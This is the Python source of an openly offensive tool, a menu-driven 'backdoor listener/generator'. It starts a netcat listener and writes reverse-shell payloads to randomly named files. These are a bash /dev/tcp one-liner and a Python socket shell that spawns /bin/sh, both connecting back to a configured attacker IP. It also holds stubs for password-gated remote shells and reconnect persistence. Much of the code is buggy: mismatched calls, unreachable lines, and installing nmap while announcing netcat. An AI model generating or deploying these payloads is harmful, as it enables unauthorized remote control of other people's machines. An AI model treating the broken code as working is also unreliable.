# Python Backdoor 0.4 Listener/Generator
# Made by Rusty50ul and Nips
# Ubuntu/Linux Version must be ran with sudo privs
# Imported modules
import os          #System Commands
import subprocess  #Multiple programs
import socket      #Sending TCP Information
import sys         #stderr, stdin, stdout capability
import time        #sleep,wait for certain processes to run or activate
import string      #Name Generator
import random      #Name Generator
import urllib
#Variable
# 
# attacker = "NaN Attacker IP"   #Attacker IP
# threads = 1        #Amount of Threads
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #Socket
data = "NaN"
process = "NaN"
process_data = "NaN"
target = '0.0.0.0' #Incoming Connection
port = "1234"
sock_ip_port=target,':',port
choice = "NaN"
extension = "NaN"
prog = "NaN"
proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
output = proc.stdout.read() + proc.stderr.read()
     
def generator(): #Random String Generator
    size = 5
    chars = string.ascii_letters + string.digits
    name = [random.choice(chars) for _ in range(size)]
    return (''.join(name)+".sh")
 
name = generator() #Generate Random Name incase user doesn't configure!
def check(): #Check Config Settings
    print("your current configuration is: ")
    print("Attacker: %s" % attacker)
    print("Target: %s" % target)
    print("Port: %s" % port)
    print("Filename: %s" % name)
    print("Language: %s" % prog)
    print("The password is: %s!" % passwd)
    
    
#User input- reverse or bind shell? jump to class
#COLOR CLASS
class bcolors:
    HEAD = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
     
def fcontinue(): #Check for enter input
    anyinput = input("Press the [ENTER] key to continue ")
    if fcontinue ==  any:
        menu()
    else:
        menu()
    
def opfail(): #failing an operation/random input
    print (bcolors.WARNING + """Operation failed! Please refer to the logging for more information...""" + bcolors.ENDC)
    time.sleep(2)
    menu()
    
def progs(): #quickly print shit
    print("Your lang is: %s" % prog)
    fcontinue()
     
#Main function
def menu():
    os.system("clear")
    global prog #The type of program language [e.g. python or bash]
    global port #The port used
    global target  #The Target IP used  
    global process
    global process_data
    global data
    global threads
    global attacker #The attacker IP used
    global choice #Backdoor Builder Choice
    global name #The filename
    global passwd #The password for backdoor
    print (bcolors.OKBLUE + """
|==========================================================|
|==========================================================|
|----------------------------------------------------------|
|----____----_---_------_------__--__----------------------|
|---/ ___|--| | | |----/ \----|  \/  |--"security tool"----|
|---\___ \--| |_| |---/ _ \---| |\/| |---------------------|
|----___) |-|  _  |--/ ___ \--| |--| |---------------------|
|---|____/--|_| |_|-/_/---\_\-|_|--|_|(R)------------------|
|----------------------------------------------------------|
|==========================================================|
|==========================================================|
|Python Backdoor
|(1) [Reverse Shell Listener (Linux-Basic)] 
|(2) [Configure]
|(3) [Build Backdoor/Distro]
|(4) [Test-Configuration]
|(5) [Quit]
""" + bcolors.ENDC)

    usr = input("""Enter an option: """)
    if usr == "1":
        try: #Try/Except Can Bypass Sudo
            print("Updating system...")
            os.system("1")
            time.sleep(1)
            print("Installing NetCat...")
            os.system("sudo apt-get install nmap")
            time.sleep(1)
            print("Listening on %s" % port)
            os.system("nc -lvp"+ port)
            os.system("bg")
            time.sleep(1)
            menu()
        except:
            os.stderr.write('request could not be completed')
    elif usr == "2":
        print("Run Config")
        target = input("What is the IP addr of the target?: ")
        port = input("What port do you want to listen on?: ")
        attacker = input("What is your hosting IP?: ")
        print('Your target is %s and you can listen on port %s. Your IP is: %s!' % (target, port, attacker))
        name = input("What would you like the name of your file to be?: ")
        print("Your filename is: %s!" % name)
        passwd = input("What would you like the password for your backdoor to be?: ")
        print("The password is: %s!" % passwd)
        time.sleep(3)
        menu()
    elif usr == "3":
        print("Entering the Backdoor Builder...")
        time.sleep(1)
        os.system("clear")
        choice =input("""
|==========================================================|
|----------------------------------------------------------|
|Back door Builder-(SHAM)-----____-------------------------|
|Options:--------------------/ ___|------------------------|
|(1) [Windows Backdoor]------\___ \------------------------|
|(2) [Linux Backdoor]---------___) |-----------------------|
|(3) [Main Menu]-------------|____/------------------------|
|(4) [See Configuration Settings]--------------------------|
|----------------------------------------------------------|
|==========================================================|
|Enter an option: """)
        if choice == "1":
            choice = "Windows"
            print("You have selected Windows")
            time.sleep(1)
            menu()
        elif choice == "2": #Simple Reverse Shell Generator
            choice = "Linux"
            print("You have selected Linux")
            time.sleep(1)
            os.system("clear")
            typ = input("""
|==========================================================|
|----------------------------------------------------------|
|What type of Linux backdoor do you want?------------------|
|(0) [Configure Program Language]--------------------------|
|(1) [Simple Reverse Shell]--------------------------------|
|(2) [FUD Reverse Shell]-----------------------------------|
|(3) [Simple Backdoor]-------------------------------------|
|(4) [FUD Backdoor]----------------------------------------|
|(5) [Advanced Backdoor]-----------------------------------|
|----------------------------------------------------------|
|==========================================================|
|Enter an option: """)
            if typ == "0":
                faf = input("""
|==========================================================|
|----------------------------------------------------------|
|What Programming Language Will you use for this backdoor?-|
|(1) [Python]-Recommended----------------------------------|
|(2) [Bash]-Stable-----------------------------------------|
|----------------------------------------------------------|
|==========================================================|
|Enter an Option: """)
                if faf == "1":
                    prog = "Python"
                    progs()
                elif faf == "2":
                    prog = "Bash"
                    progs()
                else:
                    opfail()
            if typ == "1":
                if prog == "Bash":
                    with open(str(name), "w+") as f:
                        f.write("bash -i >& /dev/tcp/%s/%s 0>&1" % (attacker, port))
                        f.close()
                        print("Successfully Generated Your Simple Reverse Shell...")
                        print("The filename is: %s! More info: For Linux/Debian System! (%s file)" % (name, prog))
                        fcontinue()
                        menu()
                if prog == "Python":
                    with open(str(name), "w+") as f:
                        f.write("""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("%s",%s))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])""" % (attacker, port))
                        print("Seccessfully Generated Your Simple Reverse Shell...")
                        print("The filename is: %s! More info: For Linux/Debian System (%s file)" % (name, prog))
                        fcontinue()
                        menu()
            if typ == "2":
                menu()
            if typ == "3":
                menu()
            if typ == "4":
                menu()
            if typ == "5":
                menu()
            else:
                opfail()
        elif choice == "3":
            print("You are returning back to the main menu")
            time.sleep(1)
            menu()
        elif choice == "4":
            check()
            fcontinue()
        else:
            opfail()
    elif usr == "4":
        check()
        fcontinue()
    elif usr == "5":
        print("Exiting...")
        time.sleep(1)
    else:
        opfail()
        pass

   

#it is made for python 2.7, search backwards compatibility with other versions or a way to install the correct version on target system


def login_credential():                     #used to prevent unathorized login form other people listening in the socket stream(tcp) connection, needs  functionality
    global s
    pwd = s.recv(1024)
    s.send('Login: ')
    if pwd.strip() != passwd:
        print ("Password failed returning to login...")
        sleep.time(1)
        login_credential()
    else:
        s.send("Connected! Here is your shell %s..." % usr) #socket sends a message to the user that he is now connected and ready to issue commands via the shell() function
        shell() #this is where the meterpreter functionality will be added, getid, cwd, all of that can be done using OS module
                #create a shell FUNCTION and add 'pass'
def shell():
    global s
    global proc
    global output
    while True:
        data= s.recv(1024)
        if data.strip() == 'ENDNOW':
            break
            s.send(output)
            s.send('>')
def backdoor_connect(): #FIRST STEP, connect to the attacker system and prompt login credential
    global attacker
    global port 
    global s
    s.connect((attacker,port))
    login_credential()

def persistence():
    global port
    global attacker
    port="NaN"
    attacker="NaN"
    while isconnected() == False:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((attacker,port))
def isconnected():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((attacker,port))
    except:
        os.stderr.write('NOT connected!')

menu() #Run the Menu Code
